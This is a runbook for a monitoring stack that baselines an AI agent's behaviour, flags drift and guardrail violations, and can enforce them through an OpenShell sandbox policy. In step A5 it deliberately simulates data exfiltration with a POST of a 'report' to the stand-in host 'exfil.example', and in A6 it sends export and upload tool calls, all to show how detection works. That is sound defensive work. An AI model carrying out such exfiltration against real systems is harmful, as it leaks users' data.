# datRail demo runbook: demo agent, your own agent, and an agent in an OpenShell sandbox

Hands-on walk of the datrail-project stack. The install pins published images (on 2026-10-29: railmon `0.1.0-m15`, raildash `0.2.0-rc.14`, rule pack 14); the steps were last walked on a Mac on 2026-10-23 with `0.1.0-m7` and `0.2.0-rc.4`. Every step says what to run, what RailDash should show, and how long it takes. Everything here was run on a GCP x86_64 VM (Ubuntu 24.04) and, for the own-agent part, on an Apple Silicon Mac with Docker Desktop.

Two windows: **T1** is a shell on the host (or an SSH session with `-L 8000:127.0.0.1:8000` if the host is remote), **T2** is a browser on http://127.0.0.1:8000 . If 8000 is taken, start the stack with `RAILDASH_PORT=18000` and use that.

Prerequisites (INSTALL.md): Docker Engine or Docker Desktop with Compose v2, a kernel with BTF (`ls /sys/kernel/btf/vmlinux`), `git clone https://github.com/datrail/datrail-project && cd datrail-project`.

---

## Part 0: where to run it

| Host | What works | Notes |
| --- | --- | --- |
| Linux x86_64 with Docker Engine | everything, including `make test` and OpenShell (Part C) | what CI uses |
| Linux arm64 with Docker Engine | Parts A and B, `make test` | OpenShell ships an amd64 .deb only, so no Part C |
| A GCP VM | everything | recipe below; about $0.13 an hour while running |
| Mac with Docker Desktop (Apple Silicon, run 10/15, 10/20 and 10/23; Intel expected, not yet run) | Parts A and B, `make test`; the probes see agents in containers only | `make test` asks Docker's engine since DR-254 (see Troubleshooting); OpenShell has no Mac package |
| Windows, WSL2 with Docker Engine in the distro | Parts A and B, `make test` | Docker Desktop on WSL2: agents in containers only |

### A GCP VM in five commands

No external IP (the VM does not need one, and many org policies forbid it): SSH goes through IAP and outbound traffic through a Cloud NAT. Replace `datrail-demo-...` with your own names and `<your-project>` with a project you have Compute Admin on.

```bash
gcloud auth login
gcloud compute instances create datrail-demo --project <your-project> --zone us-east1-b --machine-type e2-standard-4 --image-family ubuntu-2404-lts-amd64 --image-project ubuntu-os-cloud --boot-disk-size 50GB --boot-disk-type pd-balanced --no-address --metadata enable-oslogin=TRUE
gcloud compute routers create datrail-demo-router --project <your-project> --region us-east1 --network default
gcloud compute routers nats create datrail-demo-nat --project <your-project> --region us-east1 --router datrail-demo-router --auto-allocate-nat-external-ips --nat-all-subnet-ip-ranges
gcloud compute ssh datrail-demo --project <your-project> --zone us-east1-b --tunnel-through-iap -- -L 8000:127.0.0.1:8000
```

The last line is also how you log in every time: it forwards the VM's RailDash to http://127.0.0.1:8000 on your laptop, so keep that terminal open while you demo. The first SSH right after boot can fail with code 255; retry after 15 s.

On the VM, once: Docker Engine from Docker's apt repo, `sudo usermod -aG docker $USER`, `sudo loginctl enable-linger $USER` (OpenShell's gateway is a user-level systemd service and dies with the SSH session otherwise), log out and in, then `git clone https://github.com/datrail/datrail-project.git`. The exact apt commands, the stop / start / delete commands and the costs are in `GCP_VM_SETUP.md`.


---

## Part A: the demo agent (about 12 minutes)

### A0. Start clean

```bash
cd ~/datrail-project && docker compose down -v && docker compose up -d
```

`down -v` removes the previous baseline and guardrail. The first `up` pulls the RailMon and RailDash images the install pins (18 s on a Mac on 10/23); later starts take seconds. To build from source instead, `make update` (INSTALL, Build from source). Then:

```bash
docker compose ps
```

Six services Up, raildash `(healthy)`. Open http://127.0.0.1:8000 .

### A1. What you see (2 minutes)

- Interactions count rising; the Interaction log shows `POST 127.0.0.1:8443 /v1/demo`, `/v1/demo/other`, `/mcp`, status 200, in pairs (client side and server side).
- Under "Agent Security Profile alignment" the first ASP arrives within a minute, a second one a minute later (with file access). **Inspect evidence**: `observed_listeners` has `127.0.0.1:8443`, `observed_file_access` has `demo_client.py`.
- "Observed security profile" already lists DATA ACTIONS `mcp@127.0.0.1/mcp__read_doc · read`.

Say: this is the agent's security check-up, one per minute; nothing new is stored when nothing changed.

### A2. Lock the baseline (30 s)

Once the second ASP is in, click **Lock this as your alignment baseline** on the newest one. Status becomes **ALIGNED · v1.0 (active)**.

### A3. Drift (1 minute)

```bash
docker exec -d datrail-demo-agent python3 -m http.server 9000 --bind 127.0.0.1
```

At the next scan (`SCAN_INTERVAL`, 60 s by default; CI runs at 10 s): **DRIFT DETECTED**, listing `observed_listeners` (9000/python3 added) and `observed_file_access` (what http.server read, plus `__pycache__`). Expand Before/After. Do not click Accept; keep v1.0.

### A4. Data Guardrail (2 minutes)

Scroll to "Data Guardrail":

- The proposal lists: Uploads to 127.0.0.1, Saved files `**/__pycache__/*.pyc`, Data actions allowed `read_doc: read`, `upload_file` blocked until allowed; under "would be violations" two rows, `tcp/127.0.0.1/8443` and `127.0.0.1`.
- **Adopt** → version g1, VIOLATED, three rows: 9000 and 8443 (Service ports), 127.0.0.1 (Out-of-spec calls).
- Service ports **Allow all 2** → g2; on the 127.0.0.1 row **Allow this** → g3. Within seconds to a minute: **HELD**.

Say: the baseline is "what it normally does"; the guardrail turns that into rules, and anything unseen needs a human.

### A5. Violations (2 minutes)

Two commands, one at a time:

```bash
docker exec datrail-demo-agent sh -c 'mkdir -p /data && echo report > /data/report.zip'
```

```bash
docker exec datrail-demo-agent python3 -c '
import http.client, ssl
c = http.client.HTTPSConnection("127.0.0.1", 8443, context=ssl._create_unverified_context())
c.request("POST", "/upload", body=b"{\"report\": 1}", headers={"Host": "exfil.example", "Content-Type": "application/json"})
print(c.getresponse().status)'
```

Within a minute **VIOLATED**: Saved files `/data/report.zip`; Uploads and Out-of-spec calls one row each, `exfil.example`. Service ports and Data actions stay held.

Optional: show **Acknowledge** (clears the row until it recurs) and **Allow this** (a new version that permits it).

### A6. Data actions (2 minutes)

Three commands, a few seconds apart:

```bash
docker exec datrail-demo-agent python3 /opt/railmon/tools/local-demo/demo_mcp_call.py upload_file
```

```bash
docker exec datrail-demo-agent python3 /opt/railmon/tools/local-demo/demo_mcp_call.py export_all
```

```bash
docker exec datrail-demo-agent python3 /opt/railmon/tools/local-demo/demo_mcp_call.py --garbage
```

Within seconds DATA ACTIONS shows three rows: `upload_file · upload` (carrying an image), `export_all · unclassified`, `127.0.0.1/mcp · unreadable call`; a minute later `export_all` gains `not offered by 127.0.0.1/mcp`. Data actions turns violated.

### A7. Egress (30 s)

The card's Egress reads **Open**. **Require containment** → g4, and Egress containment is violated (the demo agent is on an ordinary Docker network). An agent in an OpenShell sandbox reads Contained; that is Part C.

Order note: do A6 before A7, or wait a few seconds after Require containment before sending the A6 commands. On raildash before #82 (merged 10/15), a call captured in the same second a version is created was not judged.

### A8. Wrap up

Leave it running, or `docker compose down -v && docker compose up -d` to start over.

---

## Part B: your own agent

### B1. The CI form (what `STACK_MODE=own-agent make test` does)

The stack starts without the demo agent and watches a container you start afterwards:

```bash
AGENT_CONTAINER=my-agent docker compose up -d --scale demo-agent=0
docker run -d --name my-agent <your image> <your agent>
```

RailDash names the agent by the scanner's agent key (`AGENT_KEY`, default the container name). The collector finds the agent's TLS on its own (a loaded libssl, or one built into the executable as in Node) and re-attaches after `docker restart my-agent`. A1, A2 and A7 then apply as written, and drift and the guardrail follow whatever your agent does. A3 to A6 as written need the RailMon demo image (its `python3`, the 8443 server and `demo_mcp_call.py`), which is why CI's own-agent mode runs that image as `my-agent`.

### B2. A real agent (OpenClaw on Node, run on a Mac on 10/15 and 10/20)

What we ran: an OpenClaw agent in a container (Node 22, model calls to Gemini's OpenAI-compatible endpoint), `<your-agent>` below.

```bash
RAILDASH_PORT=18000 AGENT_CONTAINER=<your-agent> docker compose up -d --scale demo-agent=0
```

Check the attach in the logs:

```bash
docker compose logs railmon-collect | grep attaching
```

Expected: `attaching to <your-agent>: pid <n> (openclaw-gatewa) has TLS built into /usr/local/bin/node`. Then drive one turn:

```bash
docker exec <your-agent> openclaw agent --agent main --json --timeout 300 --message "Reply with the single word READY."
```

Within seconds the Interaction log shows `POST generativelanguage.googleapis.com /v1beta/openai/chat/completions 200`, about 55 KB out and 2 KB in. The first ASP names the agent after its compose project and service (or `AGENT_KEY`), with the listener `0.0.0.0:18789`.

What a real agent looks like today (so nobody is surprised):

- `observed_file_access` is capped at 512 entries and reads PARTIAL, and OpenClaw writes uuid-named `.tmp` session files on every turn. Until raildash#92 (DR-229, merged 10/22) that made every turn read as drift and the Saved files rule unverified; RailDash now compares the capped list as a window and allows the uuid name as a glob (railmon#97).
- Gemini gzips its streamed reply; since railmon#94 (DR-213) it is decoded before parsing, so the model's tool calls show under Data actions. The traffic view's `tool_calls` count still reads a streamed reply as 0.
- Host, path, model, sizes and the tool list the model was given are all read; every reply pairs.

---

## Part C: an agent in an OpenShell sandbox (about 18 minutes)

Only the agent moves into the sandbox. RailMon's four probes and RailDash stay ordinary containers outside it, started with the same `docker compose up`, plus the opt-in `openshell-collector` that reads the sandbox's policy and what OpenShell refused (C9). C10 turns the guardrail into an OpenShell policy and applies it.

### C1. Install OpenShell (once, 2 minutes)

The gateway is a user systemd service, so on a headless host it needs linger or it dies with the SSH session:

```bash
sudo loginctl enable-linger $USER
```

Install OpenShell with its own installer (https://github.com/NVIDIA/OpenShell; amd64 Linux only), then point it at Docker and register the local gateway:

```bash
printf 'OPENSHELL_COMPUTE_DRIVER=docker\n' >> ~/.config/openshell/gateway.env
systemctl --user enable --now openshell-gateway
openshell gateway add https://127.0.0.1:17670 --local --name openshell
```

(`tests/openshell/install.sh` does the same with a pinned 0.1.5 .deb, but it is written for CI hosts; its header says so.) Check:

```bash
openshell status
```

`Status: Connected` and the version you installed (CI pins 0.1.5). If it says not reachable: `systemctl --user restart openshell-gateway` and check again.

### C2. Start clean

```bash
openshell sandbox delete my-agent
```

```bash
docker compose down -v
```

(Both are fine to run when there is nothing to delete.)

### C3. Build the sandbox image (seconds when cached)

OpenShell asks of an image a non-root user and a writable `/sandbox`. `tests/openshell/Dockerfile` adds both to the RailMon image and copies python3 as `my-agent-bin` so the process name is the agent's own.

```bash
docker build -t datrail-openshell-agent:local --build-arg BASE=$(docker compose config --images | grep railmon | head -1) tests/openshell
```

`BASE` is the RailMon image the install pins, as CI passes it. The Dockerfile's default, `datrail-railmon:local`, exists only after a build from source.

### C4. Create the sandbox (30 s)

Save this as `~/agent-c.sh`. It is the demo agent's loop: its HTTPS server on 8443, the client every 10 s, once `/sandbox/outbound` exists one GET to `api.github.com/zen` per cycle, and once `/sandbox/post` exists one POST to `api.github.com/markdown` (C9), the same script CI runs.

```sh
set -eu
demo=/opt/railmon/tools/local-demo
certs=$(mktemp -d)
openssl req -x509 -newkey rsa:2048 -nodes -days 3650 -subj /CN=127.0.0.1 -keyout "$certs/key.pem" -out "$certs/cert.pem" >/dev/null 2>&1
my-agent-bin "$demo/demo_server.py" "$certs/cert.pem" "$certs/key.pem" &
while sleep 10; do
  my-agent-bin "$demo/demo_client.py" || true
  if [ -e /sandbox/outbound ]; then
    my-agent-bin -c 'import urllib.request; urllib.request.urlopen("https://api.github.com/zen", timeout=10).read()' || true
  fi
  if [ -e /sandbox/post ]; then
    my-agent-bin -c 'import urllib.request; urllib.request.urlopen(urllib.request.Request("https://api.github.com/markdown", data=b"{}", method="POST"), timeout=10).read()' || true
  fi
done
```

The policy `tests/openshell/policy.yaml` allows exactly one outside host, `api.github.com:443`; loopback needs no rule.

```bash
openshell sandbox create --name my-agent --from datrail-openshell-agent:local --policy tests/openshell/policy.yaml --detach --no-tty -- sh -c "$(cat ~/agent-c.sh)"
```

```bash
openshell sandbox list
```

`my-agent ... Ready`. `docker ps` shows two containers: `openshell-default--my-agent-<uuid>` (the agent) and the same name with `-supervisor` (OpenShell's proxy; every outside connection goes through it).

### C5. Point the stack at the sandbox (1 minute)

Name the sandbox, not its container (INSTALL, "An agent in an OpenShell sandbox"); the stack finds the container itself and keeps the agent under the sandbox's name across recreations. `COMPOSE_PROFILES=openshell` adds the opt-in collector for C9: read what it holds in INSTALL first (it mounts `~/.config/openshell` read-only, which on a local gateway is an admin credential, and shares the host's network).

```bash
COMPOSE_PROFILES=openshell AGENT_CONTAINER=openshell:my-agent docker compose up -d --scale demo-agent=0
```

`docker compose ps`: six services Up (the five plus `openshell-collector`), no demo-agent. The steps below `docker exec` into the agent, whose container name carries a random id, so look it up by label:

```bash
A=$(docker ps --format '{{.Names}}' --filter label=openshell.ai/sandbox-name=my-agent --filter label=openshell.ai/isolation-role=sandbox); echo $A
```

`$A` lives in this shell only; re-run that line in a new one.

### C6. What is different from Part A

- The first ASP's `observed_listeners` has three rows, all under the process name `openshell-sandb`: `127.0.0.1:8443`, `127.0.0.53:53 tcp`, `127.0.0.53:53 udp`. OpenShell opens the agent's sockets, and 53 is its own DNS.
- The agent is named `my-agent` (the key).
- The Data Guardrail card's Egress reads **Contained: it should not reach outside hosts itself; OpenShell enforces an allow-list**, read from Docker (sandbox labels, no network of its own, no runtime socket, no privilege). The proposal already requires containment, so there is no Require containment click.

### C7. Lock, drift, guardrail, violations, data actions

Lock the baseline as in A2. Before adopting, give RailDash the sandbox's policy file, so C10's export keeps its filesystem rules (the collector's copy carries none of those):

```bash
openshell sandbox get my-agent --policy-only > ~/my-agent-policy.yaml
```

T2: the agent's Data Guardrail card, under the Egress line (which already lists `api.github.com:443`, read by the collector), **Import a newer policy** (it reads **Import OpenShell policy** when no policy is held yet), choose `~/my-agent-policy.yaml`. Then the same as A3 to A6 with `$A` in place of `datrail-demo-agent`; the proposal allows `api.github.com` too. Differences: after Adopt the Service ports group has two rows (8443, 9000; the proposal already allows OpenShell's DNS on 53), so it is **Allow all 2**; Egress containment is held from the start.

### C8. A call that leaves the sandbox (1 minute)

```bash
docker exec $A touch /sandbox/outbound
```

Within 10 to 30 s the Interaction log shows `GET api.github.com /zen` with a status code (200, or 403 if GitHub rate-limits an anonymous caller; either proves the point). The supervisor terminated the agent's TLS and made the real connection; the collector still read the agent's side in clear.

The guardrail now reads Violated, and that is expected: two things are new since the lock. The trigger file `/sandbox/outbound` is a saved file, and the agent's first calls through OpenShell's supervisor add `tcp/127.0.0.1/ephemeral` and `udp/127.0.0.1/ephemeral` under Service ports (sockets the agent's runtime binds on loopback for them). On RailMon's next scan they show up as violations; **Allow this** on the saved file and **Allow all 2** under Service ports, and it reads Held again. C9's `/sandbox/post` adds one more saved file the same way.

### C9. What OpenShell blocked (1 minute)

The policy lets the agent read `api.github.com`, not write to it. Make it try:

```bash
docker exec $A touch /sandbox/post
```

Within a minute (the collector polls every 60 s; CI sets 10) the Egress line shows **Blocked by OpenShell**: `api.github.com:443` with `POST /markdown` and OpenShell's reason (`L7_REQUEST deny … not permitted by policy`). The Interaction log also has the `POST api.github.com /markdown`, answered 403 by OpenShell's supervisor. Neither the denial nor the blocked POST counts against the guardrail: an attempt OpenShell blocked is not a violation, because nothing left the sandbox (Lebin, 10-27). The trigger file `/sandbox/post` does count, as a saved file, like C8's (allow it as there). Until the collector's next poll the section may say "1 request answered 403 … waits for OpenShell's log"; once the denial arrives that line goes, and no Uploads row appears for `api.github.com`. Stop it:

```bash
docker exec $A rm -f /sandbox/post
```

### C10. Enforce the guardrail with OpenShell (3 minutes)

T2: with a guardrail version in force (C7's Adopt), **Download as OpenShell policy** under the Egress line saves `openshell-policy-<version>.yaml`. Open it and show three things: the header comment, listing what it could not carry (ports, upload sizes, service ports, saved files, MCP servers by name, and `127.0.0.1`, since OpenShell never authorizes loopback) and how to roll back; your imported `filesystem_policy`, `landlock` and `process`, unchanged; and `api.github.com` as an endpoint with `enforcement: audit` and the agent's binary. Make sure C9's trigger is gone first (`docker exec $A rm -f /sandbox/post`): the export's endpoint is `enforcement: audit`, which lets the POST through, so a trigger still there makes the agent's POST leave the sandbox and RailDash rightly shows it under Uploads. RailDash never applies the export; you do (INSTALL, "Enforce the guardrail with OpenShell"):

```bash
openshell policy list my-agent
```

Note the revision whose status is `Loaded`, N. Apply the export (the path is wherever the browser saved it; on a remote host, copy it there first):

```bash
openshell policy set my-agent --policy ~/Downloads/openshell-policy-<version>.yaml --wait
```

`openshell policy list my-agent` now shows a new revision Loaded, and `openshell sandbox get my-agent --policy-only` has `raildash_api_github_com` where `github_api` was; the collector's next poll shows it on the Egress line. Roll back to N:

```bash
openshell policy get my-agent --rev N --base --output json | jq -e .policy > before.json
```

```bash
openshell policy set my-agent --policy before.json --wait
```

`github_api` is back. Use the JSON form: plain `policy get` prints the revision's details before the policy, which `policy set` cannot read. `--wait` exits 1 if the sandbox rejects a revision; under OpenShell's default `fail_closed` a revision it can't load blocks the agent's traffic, so check `policy list` after each set.

### C11. Clean up

```bash
openshell sandbox delete my-agent
```

```bash
docker compose down -v
```

---

## Troubleshooting

- `openshell status` not reachable: restart the gateway (C1). Still down: `loginctl show-user $USER -p Linger` must say `Linger=yes`.
- `sandbox create` says already exists: C2 was skipped.
- `docker exec $A` says no such container: `$A` was empty or is from an earlier sandbox; re-run C5's lookup.
- No **Blocked by OpenShell** and no "read by the collector": `docker compose logs openshell-collector`; the stack was started without `COMPOSE_PROFILES=openshell` (C5), or `openshell status` is not Connected.
- `policy set` exits 1 or the sandbox stops answering after it: the file lacks the imported static sections (C7's import was skipped, and the header says `version: 1` without one). Roll back as in C10.
- Nothing arrives for a Node agent started with `COLLECT_TARGET="--comm ..."`: Node bundles its TLS; use `AGENT_CONTAINER` instead (railmon#70, datrail-project#18).
- `make test` on a Mac: since DR-254 (#67) its architecture and BTF checks ask Docker's engine, not the Mac. Stop the running stack first: `docker compose down; STACK_IMAGES=pinned make test; docker compose up -d` (INSTALL, Mac row).

## Timings measured

Measured at CI's `SCAN_INTERVAL=10`. The stack's default is 60 s, so on a default install anything that waits for a scan takes up to a minute.

| Step | Measured |
| --- | --- |
| First start, image-only install (Mac, 23 Oct) | 18 s |
| Build from source (`make update`), VM e2-standard-4 | 4 min 51 s |
| Build from source, railmon on an M-series Mac, cold cache | about 2 min |
| First ASP after `up` | about 1 min |
| Drift after opening a port | within 15 s at `SCAN_INTERVAL=10`; up to a minute at the default |
| Held after Allow | seconds to 1 min |
| Violations after the commands | within 30 s at `SCAN_INTERVAL=10`; up to a minute at the default |
| Data-action rows | seconds; `not offered` after 1 min |
| GET through OpenShell's supervisor | 10 to 30 s after `touch /sandbox/outbound` |
| `make test`: demo / own-agent / openshell | 417 s / 433 s / 464 s (10/15); 696 s (with rebuild) / 422 s / 438 s on 10/20; image-only demo run 426 s |
